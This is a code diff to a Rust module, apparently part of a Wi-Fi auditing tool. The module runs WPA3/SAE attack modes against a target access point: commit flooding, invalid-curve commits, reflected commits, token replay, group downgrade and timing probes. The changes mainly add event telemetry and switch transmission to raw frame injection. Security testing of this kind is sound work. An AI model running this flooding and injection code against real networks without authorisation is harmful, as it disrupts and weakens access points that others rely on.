@@ -31,8 +31,13 @@ use std::thread;
 use std::time::{Duration, Instant};
 
 use crate::adapter::SharedAdapter;
+use crate::attacks::next_attack_id;
 use crate::core::{EventRing, MacAddress, TxOptions};
+use crate::core::chip::ChipCaps;
 use crate::store::Ap;
+use crate::store::update::{
+    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
+};
 use crate::protocol::sae::sae_status;
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -206,6 +211,20 @@ impl Default for Wpa3Phase {
     fn default() -> Self { Self::Idle }
 }
 
+impl Wpa3Phase {
+    /// Convert to the normalized AttackPhase for delta emission.
+    fn to_attack_phase(&self) -> AttackPhase {
+        match self {
+            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
+            Self::ChannelLock => AttackPhase { label: "ChannelLock", is_active: true, is_terminal: false },
+            Self::Probing => AttackPhase { label: "Probing", is_active: true, is_terminal: false },
+            Self::Flooding => AttackPhase { label: "Flooding", is_active: true, is_terminal: false },
+            Self::Analyzing => AttackPhase { label: "Analyzing", is_active: true, is_terminal: false },
+            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
+        }
+    }
+}
+
 // ═══════════════════════════════════════════════════════════════════════════════
 //  Per-mode verdict
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -315,6 +334,9 @@ pub struct Wpa3Info {
     pub start_time: Instant,
     pub elapsed: Duration,
     pub frames_per_sec: f64,
+    /// Accumulated wall-clock time spent in sleep/recv_timeout waits.
+    /// Subtracted from elapsed when computing frames_per_sec.
+    pub wait_time: Duration,
 
     // === TX Feedback (ACK/NACK from firmware) ===
     pub tx_feedback: crate::core::TxFeedbackSnapshot,
@@ -345,6 +367,7 @@ impl Default for Wpa3Info {
             start_time: Instant::now(),
             elapsed: Duration::ZERO,
             frames_per_sec: 0.0,
+            wait_time: Duration::ZERO,
             tx_feedback: Default::default(),
             results: Vec::new(),
         }
@@ -489,6 +512,16 @@ fn run_wpa3_attack(
     let our_mac = shared.mac();
     let tx_fb = shared.tx_feedback();
     tx_fb.reset();
+    let attack_id = next_attack_id();
+
+    // Emit AttackStarted delta
+    shared.emit_updates(vec![StoreUpdate::AttackStarted {
+        id: attack_id,
+        attack_type: AttackType::Wpa3,
+        target_bssid: target.bssid,
+        target_ssid: target.ssid.clone(),
+        target_channel: target.channel,
+    }]);
 
     let is_wpa3 = {
         let i = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -499,19 +532,20 @@ fn run_wpa3_attack(
         i.target_transition
     };
 
-    push_event(events, start, Wpa3EventKind::AttackStarted {
+    push_event(shared, events, start, Wpa3EventKind::AttackStarted {
         bssid: target.bssid, ssid: target.ssid.clone(), channel: target.channel,
         is_wpa3, transition: is_transition,
-    });
+    }, attack_id);
 
     if let Err(e) = shared.lock_channel(target.channel, "wpa3") {
-        push_event(events, start, Wpa3EventKind::Error {
+        push_event(shared, events, start, Wpa3EventKind::Error {
             message: format!("channel lock to ch{} failed: {e}", target.channel),
-        });
+        }, attack_id);
         return;
     }
-    push_event(events, start, Wpa3EventKind::ChannelLocked { channel: target.channel });
-    thread::sleep(params.channel_settle);
+    push_event(shared, events, start, Wpa3EventKind::ChannelLocked { channel: target.channel }, attack_id);
+    tracked_sleep(params.channel_settle, info);
+
 
     let mut total_tested: u32 = 0;
     let mut total_vulnerable: u32 = 0;
@@ -528,9 +562,9 @@ fn run_wpa3_attack(
             info.elapsed = start.elapsed();
         }
 
-        push_event(events, start, Wpa3EventKind::ModeStarted {
+        push_event(shared, events, start, Wpa3EventKind::ModeStarted {
             mode: *mode, index: idx as u32 + 1, total: modes.len() as u32,
-        });
+        }, attack_id);
 
         // Transition downgrade needs AP engine (not yet implemented)
         if *mode == Wpa3Mode::TransitionDowngrade {
@@ -539,7 +573,7 @@ fn run_wpa3_attack(
             } else {
                 "requires AP engine (not yet implemented)".to_string()
             };
-            push_event(events, start, Wpa3EventKind::ModeSkipped { mode: *mode, reason: reason.clone() });
+            push_event(shared, events, start, Wpa3EventKind::ModeSkipped { mode: *mode, reason: reason.clone() }, attack_id);
             total_skipped += 1;
             {
                 let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -549,15 +583,15 @@ fn run_wpa3_attack(
                     r.detail = reason;
                 }
             }
-            push_event(events, start, Wpa3EventKind::ModeComplete {
+            push_event(shared, events, start, Wpa3EventKind::ModeComplete {
                 mode: *mode, verdict: Wpa3Verdict::Skipped, elapsed_ms: 0,
-            });
+            }, attack_id);
             continue;
         }
 
         let result = run_mode(
             shared, reader, &target.bssid, *mode, params, &our_mac,
-            info, events, running, start,
+            info, events, running, start, attack_id,
         );
 
         total_tested += 1;
@@ -572,29 +606,46 @@ fn run_wpa3_attack(
             }
         }
 
-        push_event(events, start, Wpa3EventKind::ModeComplete {
+        push_event(shared, events, start, Wpa3EventKind::ModeComplete {
             mode: *mode, verdict: result.verdict, elapsed_ms: result.elapsed.as_millis() as u64,
-        });
+        }, attack_id);
+
+        // Emit counters after each mode (natural batch point)
+        emit_counters(shared, attack_id, info, start, &tx_fb);
     }
 
     shared.unlock_channel();
-    push_event(events, start, Wpa3EventKind::ChannelUnlocked);
+    push_event(shared, events, start, Wpa3EventKind::ChannelUnlocked, attack_id);
 
     let elapsed = start.elapsed();
-    push_event(events, start, Wpa3EventKind::AttackComplete {
+    push_event(shared, events, start, Wpa3EventKind::AttackComplete {
         tested: total_tested, vulnerable: total_vulnerable,
         skipped: total_skipped, total: modes.len() as u32, elapsed,
-    });
+    }, attack_id);
 
-    {
+    // Collect final results for AttackComplete delta
+    let final_results = {
         let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
         info.elapsed = elapsed;
-        let secs = elapsed.as_secs_f64();
-        if secs > 0.0 {
-            info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
+        let active = elapsed.saturating_sub(info.wait_time);
+        let active_secs = active.as_secs_f64();
+        if active_secs > 0.0 {
+            info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / active_secs;
         }
         info.tx_feedback = tx_fb.snapshot();
-    }
+        info.results.clone()
+    };
+
+    // Emit AttackComplete with final results
+    shared.emit_updates(vec![StoreUpdate::AttackComplete {
+        id: attack_id,
+        attack_type: AttackType::Wpa3,
+        result: AttackResult::Wpa3 {
+            tested: total_tested,
+            vulnerable: total_vulnerable,
+            results: final_results,
+        },
+    }]);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -612,18 +663,19 @@ fn run_mode(
     events: &Arc<EventRing<Wpa3Event>>,
     running: &Arc<AtomicBool>,
     attack_start: Instant,
+    attack_id: AttackId,
 ) -> Wpa3TestResult {
     let mode_start = Instant::now();
     let mut result = Wpa3TestResult::new(mode);
     result.verdict = Wpa3Verdict::Testing;
 
     match mode {
-        Wpa3Mode::Timing => run_timing(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
-        Wpa3Mode::GroupDowngrade => run_group_downgrade(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
-        Wpa3Mode::CommitFlood => run_commit_flood(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
-        Wpa3Mode::InvalidCurve => run_invalid_curve(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
-        Wpa3Mode::Reflection => run_reflection(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
-        Wpa3Mode::TokenReplay => run_token_replay(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start),
+        Wpa3Mode::Timing => run_timing(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start, attack_id),
+        Wpa3Mode::GroupDowngrade => run_group_downgrade(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start, attack_id),
+        Wpa3Mode::CommitFlood => run_commit_flood(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start, attack_id),
+        Wpa3Mode::InvalidCurve => run_invalid_curve(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start, attack_id),
+        Wpa3Mode::Reflection => run_reflection(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start, attack_id),
+        Wpa3Mode::TokenReplay => run_token_replay(shared, reader, bssid, params, our_mac, &mut result, info, events, running, attack_start, attack_id),
         _ => { result.verdict = Wpa3Verdict::Skipped; }
     }
 
@@ -680,7 +732,7 @@ fn send_sae_commit(
     }
     frame.extend_from_slice(&element);
 
-    if shared.tx_frame(&frame, &TxOptions::default()).is_ok() {
+    if shared.tx_frame(&frame, &TxOptions::injection(shared.current_channel(), shared.caps().contains(ChipCaps::HE))).is_ok() {
         let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
         info.frames_sent += 1;
         info.commits_sent += 1;
@@ -688,6 +740,13 @@ fn send_sae_commit(
     } else {
         false
     }
+}
+
+/// Sleep and accumulate the duration into info.wait_time.
+fn tracked_sleep(dur: Duration, info: &Arc<Mutex<Wpa3Info>>) {
+    thread::sleep(dur);
+    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
+    info.wait_time += dur;
 }
 
 /// Wait for an SAE Auth response from the AP.
@@ -709,11 +768,13 @@ fn wait_sae_response(
         let remaining = deadline - now;
         let rx_timeout = remaining.min(rx_poll_timeout);
 
+        let recv_t0 = Instant::now();
         match reader.recv_timeout(rx_timeout) {
             Some(frame) => {
                 {
                     let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                     info.frames_received += 1;
+                    info.wait_time += recv_t0.elapsed();
                 }
 
                 if frame.raw.len() < 30 { continue; }
@@ -736,7 +797,11 @@ fn wait_sae_response(
                 let got_commit = status == 0 && auth_seq == 1;
                 return Some((status, got_commit, frame.raw.to_vec()));
             }
-            None => continue,
+            None => {
+                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
+                info.wait_time += recv_t0.elapsed();
+                continue;
+            }
         }
     }
     None
@@ -747,9 +812,9 @@ fn run_timing(
     shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
     our_mac: &MacAddress, result: &mut Wpa3TestResult,
     info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
-    running: &Arc<AtomicBool>, attack_start: Instant,
+    running: &Arc<AtomicBool>, attack_start: Instant, attack_id: AttackId,
 ) {
-    update_phase(info, Wpa3Phase::Probing);
+    update_phase(shared, info, Wpa3Phase::Probing, attack_id);
     let mut timings: Vec<(u16, u64)> = Vec::new(); // (group_id, response_us)
 
     for &group_id in &params.groups {
@@ -767,19 +832,19 @@ fn run_timing(
                 timings.push((group_id, response_us));
                 result.frames_received += 1;
 
-                push_event(events, attack_start, Wpa3EventKind::TimingSample {
+                push_event(shared, events, attack_start, Wpa3EventKind::TimingSample {
                     group: group_id, response_us, sample_num: sample + 1,
-                });
+                }, attack_id);
             }
 
             if params.timing_delay > Duration::ZERO {
-                thread::sleep(params.timing_delay);
+                tracked_sleep(params.timing_delay, info);
             }
         }
     }
 
     // Analyze timing data
-    update_phase(info, Wpa3Phase::Analyzing);
+    update_phase(shared, info, Wpa3Phase::Analyzing, attack_id);
     result.timing_samples_count = timings.len() as u32;
 
     if !timings.is_empty() {
@@ -802,9 +867,9 @@ fn run_timing(
         result.detail = format!("CV={:.1}% (threshold={:.0}%), mean={:.0}us, stddev={:.0}us",
             cv, params.timing_cv_threshold, mean, stddev);
 
-        push_event(events, attack_start, Wpa3EventKind::TimingResult {
+        push_event(shared, events, attack_start, Wpa3EventKind::TimingResult {
             mean_us: mean, stddev_us: stddev, cv, vulnerable,
-        });
+        }, attack_id);
     } else {
         result.verdict = Wpa3Verdict::NotVulnerable;
         result.detail = "no responses received".to_string();
@@ -816,9 +881,9 @@ fn run_group_downgrade(
     shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
     our_mac: &MacAddress, result: &mut Wpa3TestResult,
     info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
-    running: &Arc<AtomicBool>, attack_start: Instant,
+    running: &Arc<AtomicBool>, attack_start: Instant, attack_id: AttackId,
 ) {
-    update_phase(info, Wpa3Phase::Probing);
+    update_phase(shared, info, Wpa3Phase::Probing, attack_id);
 
     // Test groups from weakest to strongest
     let groups: &[u16] = &[28, 19, 29, 20, 30, 21]; // BP256, P256, BP384, P384, BP512, P521
@@ -837,14 +902,14 @@ fn run_group_downgrade(
             result.frames_received += 1;
             // Accepted if AP responds with Commit or anti-clogging token request
             let acc = got_commit || status == sae_status::ANTI_CLOGGING_TOKEN_REQUIRED;
-            push_event(events, attack_start, Wpa3EventKind::GroupTested {
+            push_event(shared, events, attack_start, Wpa3EventKind::GroupTested {
                 group: group_id, accepted: acc, status,
-            });
+            }, attack_id);
             acc
         } else {
-            push_event(events, attack_start, Wpa3EventKind::GroupTested {
+            push_event(shared, events, attack_start, Wpa3EventKind::GroupTested {
                 group: group_id, accepted: false, status: 0xFFFF,
-            });
+            }, attack_id);
             false
         };
 
@@ -854,7 +919,7 @@ fn run_group_downgrade(
             if result.weakest_group == 0 { result.weakest_group = group_id; }
         }
 
-        thread::sleep(Duration::from_millis(200));
+        tracked_sleep(Duration::from_millis(200), info);
     }
 
     // Vulnerable if AP accepts multiple groups (especially non-mandatory ones)
@@ -873,9 +938,9 @@ fn run_invalid_curve(
     shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
     our_mac: &MacAddress, result: &mut Wpa3TestResult,
     info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
-    running: &Arc<AtomicBool>, attack_start: Instant,
+    running: &Arc<AtomicBool>, attack_start: Instant, attack_id: AttackId,
 ) {
-    update_phase(info, Wpa3Phase::Probing);
+    update_phase(shared, info, Wpa3Phase::Probing, attack_id);
 
     // Send commit with invalid curve point for P-256
     if !send_sae_commit(shared, bssid, our_mac, 19, true, info) { return; }
@@ -890,9 +955,9 @@ fn run_invalid_curve(
         false
     };
 
-    push_event(events, attack_start, Wpa3EventKind::InvalidCurveResult {
+    push_event(shared, events, attack_start, Wpa3EventKind::InvalidCurveResult {
         accepted, group: 19,
-    });
+    }, attack_id);
 
     result.verdict = if accepted {
         result.detail = "AP accepted invalid curve point — CRITICAL".to_string();
@@ -908,9 +973,9 @@ fn run_reflection(
     shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
     our_mac: &MacAddress, result: &mut Wpa3TestResult,
     info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
-    running: &Arc<AtomicBool>, attack_start: Instant,
+    running: &Arc<AtomicBool>, attack_start: Instant, attack_id: AttackId,
 ) {
-    update_phase(info, Wpa3Phase::Probing);
+    update_phase(shared, info, Wpa3Phase::Probing, attack_id);
 
     // Get AP's own Commit
     if !send_sae_commit(shared, bssid, our_mac, 19, false, info) { return; }
@@ -941,7 +1006,7 @@ fn run_reflection(
         reflected[10..16].copy_from_slice(our_mac.as_bytes()); // SA = us
     }
 
-    if shared.tx_frame(&reflected, &TxOptions::default()).is_ok() {
+    if shared.tx_frame(&reflected, &TxOptions::injection(shared.current_channel(), shared.caps().contains(ChipCaps::HE))).is_ok() {
         let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
         info.frames_sent += 1;
         result.frames_sent += 1;
@@ -957,7 +1022,7 @@ fn run_reflection(
         false
     };
 
-    push_event(events, attack_start, Wpa3EventKind::ReflectionResult { accepted });
+    push_event(shared, events, attack_start, Wpa3EventKind::ReflectionResult { accepted }, attack_id);
 
     result.verdict = if accepted {
         result.detail = "AP processed reflected Commit — key confusion possible".to_string();
@@ -973,16 +1038,16 @@ fn run_token_replay(
     shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
     our_mac: &MacAddress, result: &mut Wpa3TestResult,
     info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
-    running: &Arc<AtomicBool>, attack_start: Instant,
+    running: &Arc<AtomicBool>, attack_start: Instant, attack_id: AttackId,
 ) {
-    update_phase(info, Wpa3Phase::Probing);
+    update_phase(shared, info, Wpa3Phase::Probing, attack_id);
 
     // Phase 1: Trigger anti-clogging token with rapid commits
     for _ in 0..10 {
         if !running.load(Ordering::SeqCst) { return; }
         send_sae_commit(shared, bssid, our_mac, 19, false, info);
         result.frames_sent += 1;
-        thread::sleep(Duration::from_millis(10));
+        tracked_sleep(Duration::from_millis(10), info);
     }
 
     // Check for token response
@@ -995,7 +1060,7 @@ fn run_token_replay(
             result.frames_received += 1;
             if status == sae_status::ANTI_CLOGGING_TOKEN_REQUIRED && data.len() > 30 {
                 token = Some(data[30..].to_vec());
-                push_event(events, attack_start, Wpa3EventKind::TokenTriggered);
+                push_event(shared, events, attack_start, Wpa3EventKind::TokenTriggered, attack_id);
                 break;
             }
         }
@@ -1011,7 +1076,7 @@ fn run_token_replay(
     };
 
     // Phase 2: Replay the token after a delay
-    thread::sleep(Duration::from_millis(500));
+    tracked_sleep(Duration::from_millis(500), info);
 
     // Build a new commit with the captured token
     // Token goes BEFORE scalar in 802.11-2020 SAE Commit
@@ -1038,7 +1103,7 @@ fn run_token_replay(
     fill_pseudo_random(&mut element);
     frame.extend_from_slice(&element);
 
-    if shared.tx_frame(&frame, &TxOptions::default()).is_ok() {
+    if shared.tx_frame(&frame, &TxOptions::injection(shared.current_channel(), shared.caps().contains(ChipCaps::HE))).is_ok() {
         let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
         info.frames_sent += 1;
         result.frames_sent += 1;
@@ -1053,7 +1118,7 @@ fn run_token_replay(
         false
     };
 
-    push_event(events, attack_start, Wpa3EventKind::TokenReplayResult { accepted });
+    push_event(shared, events, attack_start, Wpa3EventKind::TokenReplayResult { accepted }, attack_id);
 
     result.verdict = if accepted {
         result.detail = "token accepted after replay — check time-binding".to_string();
@@ -1069,9 +1134,9 @@ fn run_commit_flood(
     shared: &SharedAdapter, reader: &crate::pipeline::PipelineSubscriber, bssid: &MacAddress, params: &Wpa3Params,
     our_mac: &MacAddress, result: &mut Wpa3TestResult,
     info: &Arc<Mutex<Wpa3Info>>, events: &Arc<EventRing<Wpa3Event>>,
-    running: &Arc<AtomicBool>, attack_start: Instant,
+    running: &Arc<AtomicBool>, attack_start: Instant, attack_id: AttackId,
 ) {
-    update_phase(info, Wpa3Phase::Flooding);
+    update_phase(shared, info, Wpa3Phase::Flooding, attack_id);
 
     let delay = if params.flood_rate > 0 {
         Duration::from_micros(1_000_000 / params.flood_rate as u64)
@@ -1101,9 +1166,11 @@ fn run_commit_flood(
         }
 
         // Non-blocking check for responses
+        let recv_t0 = Instant::now();
         if let Some(frame) = reader.recv_timeout(Duration::from_millis(1)) {
             let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
             info.frames_received += 1;
+            info.wait_time += recv_t0.elapsed();
             result.frames_received += 1;
             if frame.raw.len() >= 30 && frame.raw[0] == 0xB0 {
                 responded += 1;
@@ -1112,17 +1179,20 @@ fn run_commit_flood(
                     tokens += 1;
                 }
             }
+        } else {
+            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
+            info.wait_time += recv_t0.elapsed();
         }
 
         if sent % 50 == 0 {
             let elapsed_secs = rate_start.elapsed().as_secs_f64();
             let rate = if elapsed_secs > 0.0 { sent as f64 / elapsed_secs } else { 0.0 };
-            push_event(events, attack_start, Wpa3EventKind::FloodProgress {
+            push_event(shared, events, attack_start, Wpa3EventKind::FloodProgress {
                 sent, responded, tokens, rate,
-            });
+            }, attack_id);
         }
 
-        thread::sleep(delay);
+        tracked_sleep(delay, info);
     }
 
     result.flood_sent = sent;
@@ -1130,7 +1200,7 @@ fn run_commit_flood(
     result.flood_tokens_triggered = tokens;
 
     // Post-flood: measure degradation
-    thread::sleep(Duration::from_millis(500));
+    tracked_sleep(Duration::from_millis(500), info);
     let post_start = Instant::now();
     send_sae_commit(shared, bssid, our_mac, 19, false, info);
     let post_response = wait_sae_response(
@@ -1193,15 +1263,62 @@ fn fill_pseudo_random(buf: &mut [u8]) {
     SEED.store(state, Ordering::Relaxed);
 }
 
-fn push_event(events: &Arc<EventRing<Wpa3Event>>, start: Instant, kind: Wpa3EventKind) {
+fn push_event(
+    shared: &SharedAdapter,
+    events: &Arc<EventRing<Wpa3Event>>,
+    start: Instant,
+    kind: Wpa3EventKind,
+    attack_id: AttackId,
+) {
     let seq = events.seq() + 1;
-    events.push(Wpa3Event { seq, timestamp: start.elapsed(), kind });
+    let timestamp = start.elapsed();
+
+    // Emit into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackEvent {
+        id: attack_id,
+        seq,
+        timestamp,
+        event: AttackEventKind::Wpa3(kind.clone()),
+    }]);
+
+    // Push to legacy EventRing (still consumed by CLI polling path)
+    events.push(Wpa3Event { seq, timestamp, kind });
 }
 
-fn update_phase(info: &Arc<Mutex<Wpa3Info>>, phase: Wpa3Phase) {
+fn update_phase(
+    shared: &SharedAdapter,
+    info: &Arc<Mutex<Wpa3Info>>,
+    phase: Wpa3Phase,
+    attack_id: AttackId,
+) {
+    // Emit phase change into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
+        id: attack_id,
+        phase: phase.to_attack_phase(),
+    }]);
+
+    // Update legacy Info struct (still consumed by CLI polling path)
     let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
     info.phase = phase;
     info.elapsed = info.start_time.elapsed();
+}
+
+fn emit_counters(
+    shared: &SharedAdapter,
+    attack_id: AttackId,
+    info: &Arc<Mutex<Wpa3Info>>,
+    start: Instant,
+    tx_fb: &Arc<crate::core::TxFeedback>,
+) {
+    let info = info.lock().unwrap_or_else(|e| e.into_inner());
+    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
+        id: attack_id,
+        frames_sent: info.frames_sent,
+        frames_received: info.frames_received,
+        frames_per_sec: info.frames_per_sec,
+        elapsed: start.elapsed(),
+        tx_feedback: tx_fb.snapshot(),
+    }]);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
